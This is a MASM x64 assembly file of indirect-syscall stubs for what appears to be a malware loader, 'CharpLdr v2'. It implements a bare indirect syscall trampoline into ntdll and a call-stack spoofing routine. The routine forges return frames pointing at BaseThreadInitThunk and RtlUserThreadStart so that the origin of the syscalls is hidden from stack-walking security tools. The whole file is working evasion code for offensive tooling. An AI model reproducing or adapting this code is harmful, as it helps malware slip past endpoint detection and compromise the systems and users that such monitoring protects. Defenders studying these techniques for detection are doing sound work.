;; syscalls.asm -- MASM x64
;; Indirect syscall stubs for CharpLdr v2

EXTERN g_spoof_BaseThreadInitThunk : QWORD
EXTERN g_spoof_RtlUserThreadStart  : QWORD
EXTERN g_spoof_gadget_jmp_rbx     : QWORD

.code

;; ============================================================================
;; SyscallIndirect - Bare indirect syscall
;; ============================================================================
SyscallIndirect PROC
    mov r10, rcx
    mov eax, r11d
    jmp r12
SyscallIndirect ENDP

;; ============================================================================
;; SpoofCallSyscall(arg1..arg12, ssn, syscall_addr)
;;
;; C prototype:
;;   NTSTATUS SpoofCallSyscall(
;;       void* arg1,  void* arg2,  void* arg3,  void* arg4,    // RCX, RDX, R8, R9
;;       void* arg5,  void* arg6,  void* arg7,  void* arg8,    // stack
;;       void* arg9,  void* arg10, void* arg11, void* arg12,   // stack
;;       uint32_t ssn,             // [RSP+68h] from caller
;;       void* syscall_addr        // [RSP+70h] from caller
;;   );
;;
;; x64 calling convention: first 4 args in RCX,RDX,R8,R9
;; Stack layout from CALLER (before CALL instruction):
;;   [RSP+00h] = shadow RCX
;;   [RSP+08h] = shadow RDX
;;   [RSP+10h] = shadow R8
;;   [RSP+18h] = shadow R9
;;   [RSP+20h] = arg5
;;   [RSP+28h] = arg6
;;   ...
;;   [RSP+60h] = arg13 (ssn)
;;   [RSP+68h] = arg14 (syscall_addr)
;;
;; After CALL pushes return address:
;;   [RSP+00h] = return address
;;   [RSP+28h] = arg5
;;   ...
;;   [RSP+68h] = ssn
;;   [RSP+70h] = syscall_addr
;; ============================================================================
SpoofCallSyscall PROC
    ;; Save all callee-saved registers
    push rbp
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    ;; 8 pushes = 40h bytes
    ;; Now: [RSP+40h] = original [RSP] = return address
    ;; Original [RSP+28h] = arg5 => now at [RSP+40h+28h] = [RSP+68h]
    ;; Original [RSP+68h] = ssn  => now at [RSP+40h+68h] = [RSP+A8h]
    ;; Original [RSP+70h] = addr => now at [RSP+40h+70h] = [RSP+B0h]

    ;; Save register args
    mov r13, rcx            ; arg1
    mov r14, rdx            ; arg2
    mov r15, r8             ; arg3
    mov rdi, r9             ; arg4

    ;; Load SSN and syscall_addr
    mov r11d, dword ptr [rsp + 0A8h]    ; ssn
    mov r12,  qword ptr [rsp + 0B0h]    ; syscall_addr

    ;; Now we need to set up a proper stack frame for the syscall.
    ;; The syscall needs: RCX(R10)=arg1, RDX=arg2, R8=arg3, R9=arg4
    ;; Stack: [RSP]=ret_addr, [RSP+8..20h]=shadow, [RSP+28h]=arg5, ...
    ;; We need at least 20h shadow + extra args

    ;; Save our frame pointer
    mov rbx, rsp            ; save current RSP

    ;; Allocate new stack frame: shadow(20h) + 8 stack args(40h) + fake frames(30h) + align
    ;; = B0h, round up to C0h
    sub rsp, 0C0h
    and rsp, 0FFFFFFFFFFFFFFF0h  ; 16-byte align

    ;; Copy stack arguments (arg5 through arg12)
    ;; arg5 was at [rbx + 68h]
    mov rax, [rbx + 68h]
    mov [rsp + 28h], rax        ; arg5
    mov rax, [rbx + 70h]
    mov [rsp + 30h], rax        ; arg6
    mov rax, [rbx + 78h]
    mov [rsp + 38h], rax        ; arg7
    mov rax, [rbx + 80h]
    mov [rsp + 40h], rax        ; arg8
    mov rax, [rbx + 88h]
    mov [rsp + 48h], rax        ; arg9
    mov rax, [rbx + 90h]
    mov [rsp + 50h], rax        ; arg10
    mov rax, [rbx + 98h]
    mov [rsp + 58h], rax        ; arg11
    mov rax, [rbx + 0A0h]
    mov [rsp + 60h], rax        ; arg12

    ;; Check if stack spoofing is available
    mov rax, qword ptr [g_spoof_BaseThreadInitThunk]
    test rax, rax
    jz do_syscall               ; skip frame building if not initialized

    ;; Build fake RBP chain for stack walk
    ;; Terminator at RSP+B0h
    mov qword ptr [rsp + 0B0h], 0       ; RBP = NULL
    ;; Frame 2 at RSP+A0h
    lea rax, [rsp + 0B0h]
    mov qword ptr [rsp + 0A0h], rax     ; saved RBP -> terminator
    mov rax, [g_spoof_RtlUserThreadStart]
    mov qword ptr [rsp + 0A8h], rax     ; ret addr = RtlUserThreadStart
    ;; Frame 1 at RSP+90h
    lea rax, [rsp + 0A0h]
    mov qword ptr [rsp + 90h], rax      ; saved RBP -> frame 2
    mov rax, [g_spoof_BaseThreadInitThunk]
    mov qword ptr [rsp + 98h], rax      ; ret addr = BaseThreadInitThunk
    ;; Set RBP
    lea rbp, [rsp + 90h]

do_syscall:
    ;; Set up register args for the syscall
    mov rcx, r13            ; arg1
    mov rdx, r14            ; arg2
    mov r8,  r15            ; arg3
    mov r9,  rdi            ; arg4

    ;; Do the indirect syscall
    mov r10, rcx            ; Windows syscall ABI
    mov eax, r11d           ; SSN

    ;; Push return address and jump to syscall;ret in ntdll
    lea rsi, [epilogue]
    mov [rsp], rsi          ; return address
    jmp r12                 ; -> syscall; ret -> epilogue

epilogue:
    ;; RAX = NTSTATUS result
    ;; Restore stack
    mov rsp, rbx

    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    pop rbp
    ret
SpoofCallSyscall ENDP

END
